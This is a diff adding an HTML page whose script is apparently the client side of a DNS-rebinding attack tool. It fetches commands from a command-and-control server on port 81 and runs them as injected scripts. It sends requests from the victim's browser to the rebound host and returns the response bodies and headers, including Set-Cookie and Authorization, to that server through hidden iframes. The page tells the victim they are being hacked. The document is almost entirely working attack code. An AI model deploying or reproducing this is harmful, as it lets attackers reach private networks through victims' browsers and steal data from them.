@@ -1,0 +1,153 @@
+<html>
+<head>
+    <style type="text/css">
+        iframe {
+            display: none;
+            border: 0;
+            visibility: hidden;
+        }
+    </style>
+</head>
+
+<body>
+
+<script type="text/javascript">
+    String.prototype.endsWith = function (suffix) {
+        return this.indexOf(suffix, this.length - suffix.length) !== -1;
+    };
+
+    String.prototype.startsWith = function (prefix) {
+        return this.indexOf(prefix) == 0;
+    };
+
+    // credits to Douglas Crockford's Remedial JavaScript (http://javascript.crockford.com/remedial.html) for this function
+    String.prototype.supplant = function (o) {
+        return this.replace(/{([^{}]*)}/g,
+                function (a, b) {
+                    var r = o[b];
+                    return typeof r === 'string' || typeof r === 'number' ? r : a;
+                }
+        );
+    };
+
+    // Prevents URI encoding of line breaks - some browsers seem to encode line breaks in HTML attributes
+    String.prototype.escapeBreaks = function () {
+        return this.replace(/\r\n/g, "{{RN}}").replace(/\n/g, "{{N}}");
+    };
+
+    var callbackInterval = 3000;
+    var callbackPort = '81';
+    var callbackDomain = window.location.hostname;
+
+    if (callbackDomain.endsWith('/')) {
+        callbackDomain = callbackDomain.slice(0, -1);
+    }
+
+    var callbackUrl = "{proto}//{cbDomain}:{cbPort}".supplant({proto: window.location.protocol, cbDomain: callbackDomain, cbPort: callbackPort});
+
+    var counter = 0;
+    // get called to pull instruction from the server
+    function pollServer() {
+        // we need a counter here since some browser just cache the script that's returned the first time even though no-cache is set
+        var url = callbackUrl + '/poll' + counter++;
+
+        try {
+            var scriptElement = document.createElement('script');
+            scriptElement.type = 'text/javascript';
+            scriptElement.src = url;
+            document.body.appendChild(scriptElement);
+        } catch (err) {
+            console.log(err.message);
+        }
+    }
+
+    // Sends a request to the rebound domain
+    function request(id, url, postData, authentication) {
+        var desiredHeaders = ['Content-Length', 'Content-Type', 'Content-Location', 'Expires', 'Set-Cookie', 'Authorization', 'Server', 'Refresh'];
+
+        var requestMethod = postData ? 'POST' : 'GET';
+
+        var requestObject;
+        try {
+            requestObject = new XMLHttpRequest();
+        } catch (err) {
+            console.log(err);
+            return;
+        }
+
+        try {
+            requestObject.open(requestMethod, url, true);
+
+            if (authentication) {
+                requestObject.setRequestHeader("Authentication", authentication);
+            }
+
+            requestObject.onreadystatechange = function () {
+                if (requestObject.readyState != 4) {
+                    return;
+                }
+
+                var ret = {
+                    body: "",
+                    status: "",
+                    headers: ""
+                };
+
+                ret.status = "HTTP/1.0 " + requestObject.status + " " + requestObject.statusText;
+                ret.body = requestObject.responseText;
+
+                var allHeaders = requestObject.getAllResponseHeaders().split("\r\n");
+                for (var i = 0; i < allHeaders.length; i++) {
+                    for (var j = 0; j < desiredHeaders.length; j++) {
+                        if (allHeaders[i].startsWith(desiredHeaders[j])) {
+                            ret.headers += allHeaders[i] + "\r\n";
+                        }
+                    }
+                }
+
+                callback(id, "{status}\r\n{hdrs}\r\n{boddy}".supplant({status: ret.status, hdrs: ret.headers, body: ret.body}));
+            };
+
+            requestObject.send(postData);
+            setTimeout(pollServer, callbackInterval);
+        } catch (err) {
+            console.log(err.message);
+        }
+
+    }
+
+    // Loads callback frame from CC server
+    function callback(rid, data) {
+        var frameId = "rebindFrame" + rid;
+        var payload = '@={id}@&{pl}'.supplant({id: rid, pl:data.escapeBreaks()});
+        var frame;
+
+        try {
+            frame = document.createElement('<iframe id="{id}" name="{name}">'.supplant({id: rid, name: payload}));
+        } catch (err) {
+            frame = document.createElement('iframe');
+            frame.name = payload;
+        }
+
+        if (frame) {
+            frame.id = frameId;
+            frame.src = callbackUrl + '/post';
+
+            document.body.appendChild(frame);
+
+            setTimeout(function () {
+                document.body.removeChild(frame);
+            }, 2000);
+        }
+    }
+
+    // Periodically poll commands from CC server
+    setTimeout(pollServer, callbackInterval);
+
+</script>
+<h1>Hey, heads up!
+    <small>You're getting hacked :D</small>
+</h1>
+</body>
+
+</html>
